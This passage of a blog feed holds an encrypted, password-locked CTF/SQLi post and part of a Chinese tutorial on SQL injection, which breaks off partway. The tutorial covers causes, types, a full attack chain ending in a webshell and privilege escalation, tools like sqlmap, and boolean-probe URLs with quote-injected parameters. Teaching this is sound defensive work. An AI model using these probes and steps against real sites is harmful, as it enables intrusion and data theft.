50e2ea15cd4702598e6b3dc435499de3b4e0bbbd499fb729efeaac2d3aece999aa209552c9bf9a47dfd9eaf787f34da6a5f76f27b2a213a814f3ec01dfc978d511cd052626ae13851a37017dbbc5122fdafb8b11a61dc3d042dacb2efc4fcf5dfbf2d6861e06ead5bdf6d0c722b9b4320ade9e2e83a7ea668d0de3bcc3afcd96c5a7bc24689f0055e6b60691f002dcd379d4dcad419fc758176362b329271a887fb6817a5300914612aa33ab3036a04819fc43ff6166a29d586b1b6a1971cb1ba0272a731066764cc503fd819cb6792abf2797046d2c390832df04dd54e7b6717d48107b7551c757ea16c9587dd0455b749805a47201003cb4a5a744fbaf7e9f4bbc3e4a117dacae087554f6a504cd42c5d67a5d900a02ee298b1090064edf263d8efe111641519ba5ee00586b6c34d75e47f832a963ccbf6ad94f92e86d8f0f13e34e1ce11ea1978cea8c13589cd719381661cca1b37cb62112bd6cf83a43acb67294d4951e97dbb784625f82dcf03c720c6853356538ab12275f7015e63986eaa9f03db5c9b9663e223992a4976ef280b8f4075a5d8ebe89a1d4261928ac9c57e9c649db0af6e8b38aef764c0da4790c3f3352df69af61ac0819804108d9d5b5c133565a0761dd2be8a14dbd2f1c77e1b11d2520fab0552c88b858c067d2fcdd122e2b7b2cb1c3f3b61bda7364c5a86b6f82357cf5592a5cf638cd4ad22188312eed48397469b49e4b6f639d5c140a0279cc1a7f3ef232ec77c4eca8ca92f499c6dd0f622bb31ac5210c0084ca00240f589683a39beff76aef263277e00fc28be152039c2fc1c27ab79e3fa22c3b8c07e8c3a670b1f03fc7dd7a74b7aed7e81e8e8f0c1752e624f13a8fe3a83080041551d8381a9a622093e31a352431fa6b734e50162079532089e8f00bb7e94a8b6b27efe7ccd75d929ba3864ab02a398de2bfe7701269500c09aab76a0ebd319396d29de5ef6549bb9380cb7261f7a56d376799a79a0c73b3e9bce588f3b5f546b88ee8f018afdec2fc984f93c31c361d2c36299f826353925b953fa75eb056732604aa75f4ee1defb4bed384cdf91222c3d7ba2927805d6b7dd41c6abd194283dff3ccc2ec5a0814a13c6efedc0e4eb6ecc19bdbd5b00fe7015a789f398afae9e815974f96a6d2c9ea7d5552ff1a5064abc2c7c239d7bd4a680c03065d29c7ae30948dc5bd7463c4871707188bb91359f125742b3150b49b6ea78384a4d3fc7bce09c499cb9b73eef004c2dc6bba596fa61570c6b1bd5f5db7cc5c6f19e457c84b125feaa1498e48ca74c2a0e94b44affbb768ab2cc7b9541583b4ce88c3cba265927a5754963a81d7cbfecffca8ce76ec87b6448b02ecad4d80a752bb970b28591508b0ca756f8de71ff45bc68f89eb2595a527475f21705edbf27be69eb232fbe75f083ead72d0eac2e72f1c2a61b81e16426b0c160cc246ef96563db0f30c0048664cea5694a540b7267e5478e6999c678c5b5aeac6316ec000ad862934ebda0ab60cdf117cdd8d7b24bc8383bd3a986e052eafb6c87be9e18ad1a7d2f29a458e4c4fc27d17e4f39e65c977311bc77b76a963e95eabddbfadbc348b8ea62b8b0c3d267debf1f8eb93faa08204fbdaf0f0b65d3e98d854d86aa69c4c0e2effda0a19c58b96df8d19f8d3ccb9e4a5217a7e8b49dd1ec6253ba5a46996a4258ae6386fee2b5b8a1641cb01fd1ce69e668e5b9592d910fc1c11292f543eba4320de341ed877fdf5a1944579fa19899205f6e0d601bee2a5a335c1180413935e0db89e569eea3d3e999b2f1d3783b7f7dba23ed8ac8ce84bba5917d485bc3d026b84fe04b42a3f1a93467c5a6291c317dadc32be4e407523160c102370466d59b38ff1b111f677a504a3212fbae7ea009c7b5b9a543281b5be6b2793e8f845f5bac5721e52810ff13d6865c56c58733b384c6b8c69f9e95927b81753345192aee5e60cc0405fea6b6955eb0b5b6f49ccee2c53e23e800a1f1327c7d93dd8d82f4b79608f5bdf1ff4754741f2828314948033cacfc227170e05654c6559166cecc5b0c9b74844143b973eaa78e6ab2598e6991834055d8b241550fbecf66bee95b6cce60aa01aae7d4993b35d4f45c704416c85a32a8a769edc1d67d662f1c226fc99f15d24251b195237d0ba9f18f07e70bfc298897423894313316a30da772a4373e183a0ebb0a70d267ba29838b550c159fe708e2695976d5f9bc5460e35cd97f00a52c3cc2caebc463b67e045d2755e71293589c4f34d03c69da9bb4ab719e7c1f5e28a269490aceb22394a05910242a9a05bb65c1f5038f4810151366ba34d52ab4b3dd0aa51060c83dbffc3ea0d0fc77c11d4e90c7e4d05168ae75a9bf72732c3d192be585f3547c100465cfb736e85ede5567333d7d1367c3ecd392c1f601f378cb781b09067238aff751646421d072208956c34d618c682db18069be63fa8e31ab86a7b08acdd9654b2bc53d140e604b765b2521872539ad8042d37a008bbd61cf6f8de404030a97460daf0ebc4a5487c23eda64ebbeaeb0e41f21fc2211d4f119925c0fd38e20e9e4bd976eb8a7bd371634391abe59de49c39d7e14f5dc2df7446779ff9d0d8b7dc6219b5107822bdafab1385828e336f5a1c3b754a72a2fcd4a1e01c1085b35531015e13c5ee39c85a3940d818063badb6d600bb5cc2786ef810d05ca27d11c4ddbb6f8838da12d96ad5501dbe5ae1c286744cd2a1bee4ce1390b9815961e221379b7fe3041ef65e2b401c6e454c1e5f6e2f452a5b7d107fe82219fe3f9c15df8c69fbd71ba2089bd37afbfaf26e3eb9e7c3ba8107fbfd4a5da96396a7cb936fb76449236bb145fb7e37e47d6da431301a7773d16e5aa5968e492ec4a821210611b8b6f46312e05a1830bfdcfcf357457148a666526ecdf00822b142fe737b8021c690f4b19fa0d53f31cde8adc5513c90edeb61dd90153c97a20e397a758eedf860ab840722d864ba4b762e3cf3bb91fd3a72d5924f37b2b16db8d156512f5c7cacc71707754dbe8a769c36a80cb77c2126bb1e60c0875407640368020d118fd834992d2546f06447fe0561561b257b46bb40e5fbdbfe98a2de01732c0eb862440f4afbb164ad5470877e9f69d138938685f16c72aaaea143921dd8243eebacc1b66bfc6a5d7a04bd947970f601fd1a5c633b8043a796945afe61b931682bb04f906d2612586a50e7deb4e8a98001e9225ffa7ed9fb6e0a6a79290e6c12f16f48a49dc2bd3d8c23e2311b498cdfed3eb346fba6a970bbd9019279c341bf5ab2b5746a729541da91c087125c0f1dde2db274169a22f53195e99919f3d0ef9565a46fe4b7c115dd93281da99ecfe477107c7e97b8a34a85afe6c201e14e8581048214830ce06cde29a19bbb0a590e59e4e2b1237b057b20819c95c4ffba409c2859a729ea82fb864bdf6fecf2b93c7f059e74be1af79a964cf687256d8b00ab83034f43b5708f0ab04eaec167fbf607d66b203ac792f4fd2aed7912e083188926efbfbf4a6af333fc3c4373348f8a1c2b04d55ff90455d0c7fc460c690a899eb9a0a7468d43ca946402b8609762a1e7fbadc006d5399bc6c856198ef1520ad099f79798ad61dbcf9140a6e2e70248539df11da5b54c4869d7fbce6f083fc06a7f9ab76ca66529396bf2e14e7f7b78ab75de06006ba21d63243d9d68012255c138ee70fc2cdec1b0542e48fede75c40d83cf1a75dbc405415184e17f18897cef506498769e843955d8f2e1adb19605c8dcbd36d1c363e30eb71a197d44738f2d146a9f604235db6fb5c8c20d2ebfd7be76bd762476c1d5734ecad08214ab04f2a269eb08bb494c3c566970eb7d9752782016648bc6caf0673fb3e36630b5062d749b90960f8c6d4c13566628d735b43b3f313a1b3a6f78d00c3340891f6fe47a33866e7bb54f54f247cc728137483b5d00aced54b7ac9a0c5683e8cab618dbd492d74eebcdc293c38203b8f9159f159b6912f16db0d6fe0318171ab05a57fde1b2653d38e7b6901ae97f6a840bcc5766f92ad7c9da93b0989ffbfe4e2721bc4675d434d358e6e187edd88ee3fc1e156d3306a1b2b79ea2db7f7ae2c16e4c87ad1ece04d859c860190b585e72f96f11039ca732c215bfdae17c42b2577486df37d00323ab3596c52fae809bdb22cb2b1ccaa6ad2e771e0a54dd5ef14ecb94716c61261af23b7044c6d1ba0e3bc051370b2ce557166ff9188eb11e73b1d34e3d1452075e0aa32dcf25ec45afd80b3d46ef6d3aa13336fc588f46236af4f08597f647455610e527e69c2dbdbf7fdbc7a204bb37f261f70aab0b2bf438e98a9709c502a795b0e55c4451d396c16de838c016051218e35ce75804b92d8a46997a29d24cf29cade35dafe151bf87479862640f32f616d010695b316495e31d40ac50d95bfe7a5215dd6d8156587b6541e6242cfab7cf5334f8fb7c3e51460224541892e18d33acc86a6ea28cd56ffda96c84450e43c7e399691038a832be2452a73f2edc989461a4761e08e051c1455271d7d19d98a8bea311bf2176818102e22f9f30f476f14499cc124acf555bd993998995fcadd6266d455510d3507a97604738d5440665e1379e90f367a918f550e6779b02074ec0a4543641f263589cf75a3b41b0579c3178385fcddf745f1744e9796e3f39e46d5b377efb60dc5e3b8d0f9170004d5714416d85ffac8cde9f2452ee371d23ae06f06087b6c6ef69b27786d77c5da667480f56d9dfae0d949f8a03e66794f1285d4744a19a5479e5225e4e9eb1c23434ec6f4da28266d40cc2842b7e0e3ead6011c29cf7581a1f36e96399f53251cafa8050f112965ca57144ee82295e075da04f42081b8ebe1ddef1e9f51fbcdafb5b7c73580f2799fb87366a4f8426d25eb5c852b7d7e3ddb7bc3ea9e8f2d47ba6bac964d0a81880924d19bbe3185462782408525f8956421cee1c7913cad2096156a5643677c7e9350f370eda4705e9eb96761bea6abdd58ca8696c266036de335ddb8d437fc112b41f12393fc7e1fcc12fbe0de07c1af7831471a6e046ef73e185d6ba39f275838372182abe4961a069d43dbd78e80ecb40571ec2cdb2d75a622212c6cc0dfd1e937cccc2a2a5847f6480335f363c687a57186ab7a03eb57c157c0de3ab03c13d6e8ced4d5a40526d16a4adf40145f892471d905e518db6cc6875c9ee9ae20589be12f588541033b182f22190711fb18494d76dbc5de118ee49430d50ab7c64ef0e63df833944180fad176dfd3e3ce8ae2184e2646bc533ea8c27695570ae0bd528afb5174608aa613d99dce1c20f53f71859f269fbb21633a4f13f22ec29c0fc2196417a9bd716cd952304423b681ab3bd77f3ff298a7c980a38557244fa68a6ab3cae3ca4e1fb2179bb661eca978ef57659d2b1c131bd24549640e3ed465f16399789a29ce465fa7a60ad2ad4300ed8fb14373e1f029f59ce2197f09e74a305a652ffb550df17ec38e12df4f2d43078d98638f4132cc34d0262aa56ae0b79d9cef3497fcb721bfd021c865d060cafd3636c79e96813b08e1d5c2656a459c1a8c7f0c80b57e835426dddb3b47cc81d91e1d6c1abd74c13925753df79be32bf32d5bcd5114ac00931e50556299d16e6d3cf47d36bdc0620a611f4853f83fa3c5e6dd25158bf3bc8757def476e074a4cf2c2b6b742584a19606810ec02c9efe4f7b5eb6fcd2312a25b7c494fea9e9e62c27e73fe28ce38c72f1726dcc38af81c3f3ae1a3b687b934a05371600fd2fcb407c2cd9ceee20f99784a0158ba9785d4d65f2f954fc19f894d7d7ea4ff0937cfae60cbeff35676b03abe01776a08127b77bf7ba3c33ebc9bd985aad179d10db3d144f0ef85416aa9fbcd67aa5774cbc238f7a94d940cf996e2c4ec330622a1855bc1ed386012acd73a8534e22bef61486df26e5f610aeafd6adbbc7e9515f7e4a13256bc8c89205c0533ea56910decc595ab707dca826d9cfaceef27d0d17846be9696d29cdd55a0041879c58c3b7cfa45196a0130c06a51db30e3d825d0fff3898416596abc7e1b04ef44e130fa97a5a99010aed19f92c81b0833ed1f68e8caec8c3c99249b34b2b93ff38955b1599458857ec415937817ecf3951c148e8e6058e916070801b9311e756d3221dc7a6c3138d624c60950dac381ffef48cb4fd63bef46258816af98d672f548f77299126a12346f8cfad40d60e59d37c603cf3c3607c0c6de14fd8d3e9eeb2c4d554448bccad5b673a447b86be39a7c8706055c62e92ecfc4f2eca62fdd6be20ad04a0443879f5132c74134f48af926fcf7e3efc9db213a3b6520acc63180fa778576f94b273b238ba959b0e8f017852f0af7304f6578f5ed6f2a9ab02c1977fe66df0d31296bf9a6c07f77b9719147212c0e73eb73408d04e22f42e5e939a97c24ebb7701541bb747b942ed4fa5bf31ae992eb9d72b3dc323a8a939454004d8f06f7f2731612b5618be7c4c4a3a9ba9de8eb4a04ed569b0177643a8247c95031bb5ce46814bd569e280b9b532181318be6386019f747babfb8df50f903a607a71478b02f754e1eeb586fbd375e05eadc36708cbe56dd4524876dde13fe36303dd8749108ba460eae99b6dd889573372587a9115e5d2a75cd086b9b3457e3b65b0bc276ad8f7405cbd4cdac295da21b176bbc18f805c8f2ad51600efdd678d7f23cc9efc1667b78d896a40079bdfa8b3d13ada10da7a365879a60c46861ee8f9add5eb2aef72c03a2e97693f4d7a1f98f5c30f219fed9e9f4e35b1f8082d9a2359b94523976b941aec735d4bd0028cc16b7eceffb181e6ee576064af76d4e88f668f133a9d77dfb731fd1ea5ce57a44d471ca4f314ae64682c6c13b902259e6932dfd638364d4872e9e9c4a5254caa710dc19ec056fc14480346457e677ba34e5135b81c7f2d669fc61c611e10566653fab47f35208539eb106f50f4abbf395aa78ec8919a2e6f92db135a69f9d56b12ddd5254cfb867290d5989a55a573b2e5b2db9bcc2ab09d127ea016b69087d82f58e9b803f8cc9783f5c7d104218986b975547c48627056c0e52890ae8c80326a2742a40cd668f362a9dc9d3695b61f760b8ccbd9b71d9c8a06376682ab9cf177b884f9e3256cb267c2a1ab80234fb47a4eaea333906e9a73a630c9be77fdcfa17f5412c1f54c4327689e714b4100df1f0048fae6d72f9c088460425fd583b6728fb758d719fa5c7e4dd783d1fe2c80405168eb47e526f489f069fe8281fc313d89c3a1be92e0a3493967ae2c81225aa353627fa4025a6c0ce65fc523b94fa388c6c14561d921279ec7f540a82fed412e45c23d9d8d34e8d0cd141d191c78e4b64e65e9357992d5a293b09e373b465c623bf530b53ee4984e9c94c80f6d683e8414eb5766c0f2614d6829ab629a57739678ce9e8b6f0c444a91f0af29421331e46d93590afcd52f47666ec136447cdadd0bfda3ac0320f404023c50b5a2343c6c8ac4bfdb57f24652cdc10ecb3e5b7c1d9f341d48a8b1606f035854c6bff1db3df6f032072bd2cb1005dffdf8dfc5975d6e35b8ad8eea65354584dcf8c31a6e349e4d351ed22fbce93409ce38c9737bd0e129605c416b68ba3561070825c18444c5f4e0f69b00d3cf03cf319fed4f357780e2b8be7193bf8e465c96342985e8bfb60279debaafe9e7d38e17ad5800876f69d3f4c009c4dcd26dacc28378667ce39152bcf40a940190cbd8e8920869af80863ba50597cbb9b28d4968f9b44ca2d46d551872d137caeb7024d0cfd07e0f2cf1ae3f4920b7bd2273192eee8836ede2a8cb1c86183e852bc3eb2c3e9d6592be8dbeede16919f92818e920f79786bf0f1ea7139c9e1690286dd7c4549388cf2bc6db86d6df77ff45b54c313a96180042df522e48ad6fec697d0e20d3972067209a72b0ca161abba9273d6dacbc93ee354df283263e5fe4889726e2080c531d6ba8103df53b73938ff393fc788c87c42d7882675fbdca4d6ce865bb1e8afbe869345783cc43bd55f8b3ac34c605efff347731f33bc6d411fed9e9ba5fc29d89ce96ccf4ffd1f3d59ddf4eddee3bc56a6073b908c913411ccd1cee3f6eef24b9b3db78848d7b04d578e7c2374a528077c5229c23088270085bfcfaa8e5a5212e41c6854e377ed3d73fafecf3f47315f178063f96934677ea94731031ff8ae2c0ac4befe94a69d23dc24127181a08fd60add9a07790267031063e91c5c0f1b0bdaf6b299965578300f3671bd071204134eafe8b71bce4ea783f5082b178c7c6b91df61bb3b290d93eab1a7c10a58b3a4d8366c54cc0e2d16731253ec0617ba5c86ea91dc6d9d6d938e5685644e1b8aeb22aa8e1d3c718c80375da439b06b26a4eed1b984bff5d87faafa4e8145c5325da120e98938d98c68b98e8fd300359f48a025d64a10b3f068ce98b714949e546d6483f82aa5b12b7bb268e48731d094b0e0646a5fc2214c5c8d1249eca1d843ce668358b63720760e54252835bf7e3df93eb6e7223fa7a74de3a170e9eb79a9081ebaa3f3364e10c170392c80c9a81ad6fe422c5fc81149db9775ec07f3daf5829846dc31a6d2f91acf36b893ca55481459051495518ab2c1ef80aaf804990f9fc0d5ff74447e0bc8feb72d1f629b078696fc45054c6cb0422d262cda52f26b9437d4f9189f403c368ea025ed6505003217be5655b5112e445f01932aaa62e700c964e030ce576ce6b2746773a007b333eb54cc75f6269eb20947d368145a07bea38304aacf5e394e2808922aacc095d48bc8da688acebe05a10e6c940c28ca5cad16a1257f4ef52e87fdb2eccec317b092ec5f1e8204716199a5c38565c001dcc32cfcf7b99d7d7c5f42a752ac6f61d645f077b904ff6740489c686f643282921d5336b7457c748dcc11ab9c1b503391ce54e0ea8e8b8cc8f01a8317aa4266990be02e52501edf66a9295b224233c3f8f0499e727c994de9b9d11cf5186def17192f0117151a2e8a1842465f4bebe71cf829cf070b02ee4e95fb190f6e045ef8c053f8857ec7f31091004fcfbf89c65af3f4791c2f389f3910306cab5eb9355ccc7bbd08b6c7d1008a6e522437aa99e21f7b4344de0f8f2abb3720d20475ff961fac36bec01bdc8468b7b6e7943b691fccbba6cfe942dd5cdf515c7579de4a0b90ab08b162320454715d2b790c330b46c6d18e3474dc906c2c4f6a2e928ced753364fa39afd4c71df448ca1564036891f13ab8850f8eaa71d9618714d9e820f2f886bb8c1451291ff038263fdf55cf67b8da23c361f9dd78dc83bc83f5615c6f7a5352cc3ae79dff43220389d0e28ea32f2b4bee8234e9560d5e7f3ad420ca512b4c1e2a2b20483b8b2d80be389067dabc9addf01a0db2a005448d69cd5ecbeee85f9bc6b984c49de0c003fc8590e83c7a634952341e8207a64cbd713322be133a03b45d8155b779d219283f4c9146630bb4beda04b1be2e87d12320fb4437d01a65cdaf8ccfb0a980afce5e4237257ae0a5eb489caa8c34729d33a32a2ae35310adb90e95044f4daa3df12d6f6d507b720e54399f813c6301e5498e97de4db1470c424a546ac0c1b0bef5f172fccc33f82608a2e2fe11150a9d9580e59152e43de4636b5c81d23fc6903fbc4e9ddb7225ef7c21b47a9e564a0f6ee8618e829d7b245a50078b2e4ba2d5a00d7384fda2965d5d99b3a25f5165d3cbf42a7e816545a0596e19824db61711cf23bcceebf702de309777679d3e0c9469e44c70f97d821f6840f681e1d571fb75519619b20c49b5cc10093e4c06b29020ed6805fec3221c1b5d5952c98a32cee909d963f630e47dea6ad8af7590321cb42b8fabc30d9097a0da737346212fcabd2912eb2454e32e803e913ab9fa34a91589227d71486b84c725feafa2bc763ce210cc4f3418b11fed1377c166225e6bd9c0e25cdc710bc1f656b590f1a3b2231826dfe067624821c0ebc98a425b2c7028ec3a3b99f5bf4de838dab188da7f9740d91838fbca0178f2730abc5c9bbc65f6d73e8d51e80982522dd43def82ff243edad0d2e69c9735bf0174936a095e38c3d8f75a491655db59b2d057c9e0c9aed1dbff323d57af5c1642cb94a06580c9b91a23b1187c1bbc56076b1d4eed4f5021e7cb6fbe329991025628d7e9e47bae117905d88110f05fc6311ad9f84169d855f32004e57963edbf67a823001fe42abea00a6e76e2788fb21c8ddace7dcd407f9498748b0dbce980b9d69b78fcd6b78cd239a06c23dfcc1aa0782ca943b9b5f2f9934bdd7810dc982ed4f916328ec0c93dcc63152d471400bb3f08856a553a822b642123946dc8f59b206ae3af9177296062b19585f1b16b55418df851f71f1fefd4351b069bcfc582a3b1846f58e551e2be3c334d66eb1665134964388fc77145a0241e555d72a3e82a4385118d5e0d9e60b27f7f7bda9a102ac41a8fc5ef6a47a55913f3ff35fadd895b8c1dbac00f1b36c73a3ab22432809c4ca8f075640a18687f69cfb8876f04d70fec0987bfca32d4b60769c094810ff00fc6fb50f0cf01c247748e65a67935d7d9e4f1c6cf76f7fec5ea8debc5ab6219a6e6c169f87c8d67fb11c536787106f2851d1b51a36131fe62785d139b5e2e891c27d9739c57495c74180b0acb4942c2c2dd58a8b306519f50a7502ca52ed459ec648e9cb468506bd84c48f674d25dcd3b74740c4566167b5c983649cfee24b9232b527aee7ac359548034c201d81653fac48802f7492dae27ab1b841359d041ffa8dc3bcd7c63a71bdc77d04060d5d859d7af89ea14bb1d7ad79d59b6d87179aad82c4c708564d3a3319fec62199d92b2f0ec093afea97c74ffa6851a22d394c8f7122292a935df63a272b204f119fb557589861b24f23d82302836e51b2cc8978d1b4dcfbee8cafc85d9f3fec994b01cb142acec29fad9d10f37c54c3f8bac8537887054602f6e096131d9f06ce7a9b3241271c8da7c19985c52a29c075a2d56d4c977db5cf93cdcbb1fd13525a968ec7743fb46ed8c96921cdfc27d5defd24d3a88d41d6dbc8460664c6006a5c91e355467395ca7dadcf006b66141d988924400a39166b925f523252856b00b7de9db5ad71692b0745ef2726e86aeba25c79c38081ac0d0289bcaf6669c5d2171166d4240939f17673c3288bbf8b07b90f9173cddf17d6a7393ca54cfbead6c8acc29837011404081ba645ca5f80291ef8d58a1ec6c0831b2a4273d31ffdb51a026534848607950d99d97e474c01bfe91247160978e4e27f1db27b7851046c55016389196684e574849b8f6dcab5ba0f6e66d74f498ae381b7d156d8528fa09a794611747c7e0d671c55ebde93b5d0fa82fefa1184056db4897acc410acd056ea1ac91dc1fa35e0bdc224f79ac412d7f741826bee9498ca7386f0358a1acd55da23c1c04424a1af3ea55c2903b1c82410369b2581a769aeb3506bf0845dfd1ef7c19f569e45351b37ee3547189176bd602e1510e8dd34331458838dddaf2d50335d09f03e7bd32b82532bfe14eaead5b399f9b33fcef4571409a916d5fdef2761d4b72fa62aedd63dde94316f905bc818bbff57a19fafb87675f5bcf2b9d1788f0f6bff087a7a7ece15d1650cdd8706c42eecbb269ac61344610f23bb1d67bd68fdc6e2f5dada2f89019a021ae3d77ff3b8d0aab7d0fb188c1bc6f06d0bc5b0424729d865ed33f82e3d0dba7a05f5395ee1d2aa7779552922fd655676ae0c6a36936d460a9554505d31bb282c153c692f62056743b8d8e7b6b9566ac6fe6c2336f51f738615e670f20181755c7643b8e4071242639f0f79763a0063182ffa10dd001e700b39ab3facb8b8bc6bda0e6b2ec91243aaa23d840b08532bb53d0789fb10d206f73ba48c4dd821f50f5ef0558a4888af19935eae8f309fbab624226c13dfe2c530589528d779c33e812080e79d32efbcbb617312122f495da9e36bb4d95a3cf1639f2fc7f519a555708381798047159c930a17f44f6d92f06d1859164a39cd596bd0b00459b4880d6e54a73c0a9d682fba8d22d213e461defa6e6fe2a64b98d67c875123e418d2dd172ebe160ff3283eb5d936e016287c717d666d85ecdc378deae9186836e4d962e985256fe68686cf0941383ad0a96d1c8007184cddeca01ddc1acb1c945bc4d52841322145af20523a8a62859b9e21b3a6484d5264b985d5ca740bdb892525514e7097db49ab99298be6db7d3effd5bebfb8cdaee0a39eb06df99661b94f04f52af4f74941f7badf8cde157c35bb5ee391aa47886f1de5ff1bf8e567107f53994934a32eaf5aa1a989da46364f9cfaf34e1a6c49463a5f75a1d3e9c7afa3f9c9e216a407d6f2b73054e6d85fa356cf34355f49ff5633add4d8f4019d7d421d2c457fd25fc7ea7ac05075f0e204b8c466540fbf24eba50443e8d97d53b670abbb875b1fb9bb7a8373d6d1b220aa625a422208b1f1e69fc8657180877fee8412121993f11acb47f45003d44cbeac5ddee76d708e8cd2eb55b4cdf9375198e7c821af8b4a72789a13d4073667482ebdedc79f4c723e73079a0ade2e49a3586155938092078b98363cddde420231c7f3a25cecb7004b714facb88ec2d6a578dc204a9ce936a59be33f78993285c46c70044fae553064fa22842aa56fdf806e76e59781cd42af0604ec99838665fbac95fe641ae09ff63e9ec1f7277bc5641e52d0055bb759bc3f29334ead8ad1412426306f5e64e27972a4462edd70fc8dc69dbc0f522fdd33c3d1f39b608ae754531502324f0b8c5b8202d4c92bd1f7ae4dba67df077725b6c584e4ffe0acd86c2c920a75148911e355d74d0fadc479f4ed6e44eff1fedf186ea73ec8335a4aa01151d3ce3d4fbc173dee72f9b06306ff422ce7f7b40171c49c8da9b0c1242ae470579c39a1dd62cda929162c9823fd2d3f5575cfdc51b2076be3b23c93e19de2efe87a5bd5c60a9a7b909dc815d75048a400f99d89d77212e9ded5143c3c01d2c3df0b535272026b7b9553420b82776f0b7ca8aab681e1524cb984f44522d00d3631505db13492a7e8ad08a531d1af2d4157c4caf8eda898463c807f1aeadaf906881275c5add9b380b38cab3382d0dbe562153d228c25e1b1e736690eda23518b11bd925cd7671ec19d6fddcfd6b32</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>Web 安全防护指南基础篇-SQL注入</title>
    <url>/post/web-basic-safety-guide-sqlinject/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ (๑˃̵ᴗ˂̵) ପ( ˘ᵕ˘ ) ੭ </p>
<span id="more"></span>



<h2 id="1-SQL-注入"><a href="#1-SQL-注入" class="headerlink" title="1 SQL 注入"></a>1 SQL 注入</h2><p>SQL 注人是指攻击者通过把恶意 SQL 命令插人到 Web 表单的输人域或页面请求的查询字符串中，并且插人的恶意 SQL 命令会导致原有 SQL 语句作用发生改变，从而达到欺骗服务器执行恶意的 SQL 命令的一种攻击方式。</p>
<p>如果数据库开启了<mark class="label warning">写权限</mark>，攻击者可利用数据库的写功能及特定函数，实现木马自动部署、系统提权等后续攻击。</p>
<h3 id="1-1-SQL注入攻击原理"><a href="#1-1-SQL注入攻击原理" class="headerlink" title="1.1 SQL注入攻击原理"></a>1.1 SQL注入攻击原理</h3><p>SQL 注入产生的原因是用户提交参数的合法性。</p>
<p>SQL 注入的本质是恶意攻击者将 SQL 代码插入或添加到程序的参数中，而程序并没有对传入的参数进行正确处理，导致参数中的数据被当作代码执行，并最终将执行结果返回给攻击者。</p>
<div class="note warning"><p>SQL注人的产生原因通常有以下几点：</p>
<p>（1）参数处理问题：</p>
<ul>
<li>对用户参数进行了错误的类型处理。</li>
<li>转义字符处理环节产生遗漏或可被绕过。</li>
</ul>
<p>（2）服务配置问题：</p>
<ul>
<li>不安全的数据库配置。</li>
<li>Web应用对错误的处理方式不当。<ul>
<li>不当的类型处理。</li>
<li>不安全的数据库配置。</li>
<li>不合理的查询集处理。</li>
<li>不当的错误处理。</li>
<li>转义字符处理不当。</li>
<li>多个提交处理不当。</li>
</ul>
</li>
</ul>
</div>

<h3 id="1-2-SQL注入的分类"><a href="#1-2-SQL注入的分类" class="headerlink" title="1.2 SQL注入的分类"></a>1.2 SQL注入的分类</h3><p>主要分为两类：</p>
<ul>
<li><mark class="label danger">回显注入</mark></li>
<li><mark class="label success">盲注</mark></li>
</ul>
<p>在了解 SQL 注人的流程之前需要知道的是：在实际使用中，Web 服务器的配置情况会直接决定 SQL 注人的成功与否。在服务器配置及防护方面，能影响 SQL 注人过程的主要有以下几个方面：</p>
<div class="note primary"><p>1 ）数据库是否开启报错请求。</p>
<p>2）服务器端是否允许数据库报错展示。</p>
<p>3）有过滤代码机制。</p>
<p>4）服务器开启了参数化查询或对查询过程<mark class="label danger">预编译</mark>。</p>
<p>5）服务器对查询进行了限速。</p>
</div>

<h3 id="1-3-回显注入"><a href="#1-3-回显注入" class="headerlink" title="1.3 回显注入"></a>1.3 回显注入</h3><p>SQL 注入漏洞的产生原因千差万别，主要与所用的数据库架构、版本有关系。</p>
<p>数据库可分为：</p>
<ul>
<li>关系型数据库：Oracle、MySQL、SQL Server、Access等。</li>
<li>非关系型数据库：MongoDB等。</li>
</ul>
<p>典型的攻击流程如下：</p>
<ol>
<li>判断 Web 系统使用的<mark class="label info">脚本语言</mark>，<mark class="label warning">发现注人点</mark>，并确定<mark class="label success">是否存在 SQL 注人漏洞</mark>。</li>
<li>判断 Web 系统的<mark class="label primary">数据库类型</mark>。</li>
<li>判断数据库中<mark class="label danger">表及相应字段的结构</mark>。</li>
<li>构造注入语句，得到<mark class="label success">表及相应字段的结构</mark>表中数据内容。</li>
<li>查找网站<mark class="label info">后台管理员</mark>，用得到的管理员账号和密码登录。</li>
<li>结合其他漏洞，上传<mark class="label default">Webshell</mark>并持续连接（留后门）。</li>
<li>进一步提权，得到<mark class="label warning">服务器的系统权限</mark>。</li>
</ol>
<p>以上为标准的 SQL 注人流程，最终的效果是<strong>获取目标站点的系统控制权限</strong>。在实际安全防护中，由于应用系统的业务特点各不相同，导致在每个阶段可获取的内容并不相同。并且5、6、7步其实与 SQL 注入没有直接关系，但可归类为 SQL 注人后的延伸攻击手段。</p>
<p>SQL 注入攻击中常见的攻击工具有</p>
<ul>
<li>啊 D 注人工具</li>
<li>havji</li>
<li>SQLmap</li>
<li>pangolin</li>
</ul>
<p>等，这些工具用法简单，能提供清晰的UI界面，并自带扫描功能，可自动寻找注人点、自动查表名、列名、字段名，并可直接注人，可查到数据库数据信息。其标准流程如下：</p>
<p>查找注人点 → 查库名 → 查表名 → 查字段名 → 查重点数据</p>
<h4 id="1-3-1-寻找注入点"><a href="#1-3-1-寻找注入点" class="headerlink" title="1.3.1 寻找注入点"></a>1.3.1 寻找注入点</h4><p>寻找注入点可以利用<strong>有回显</strong>的方法来确定页面是否有漏洞，如果没有回显，则可以进一步利用<strong>盲注</strong>的方法进行注入点探测。</p>
<div class="note danger"><p>盲注与回显注入基本相同，<mark class="label success">都是构造错误语句触发 Web 系统异常并观察</mark>。</p>
</div>

<p>如果页面对查询内容有回显，则可以利用基于数字或布尔的方法来探测是否存在漏洞，加入构造如下三个链接：</p>
<p>下三个链接，并观察页面的特点。</p>
<ol>
<li><code>http://www.test.com/showdetail.php?id=49</code></li>
<li><code> http://www.test.com/showdetail.php?id=49&#39; and &#39;1&#39;=&#39;1</code></li>
<li><code> http://www.test.com/showdetail.php?id=49&#39; and &#39;1&#39;=&#39;2</code></li>
</ol>
<p>访问以上三个链接时，产生的情况可能有如下几种：</p>
<ul>
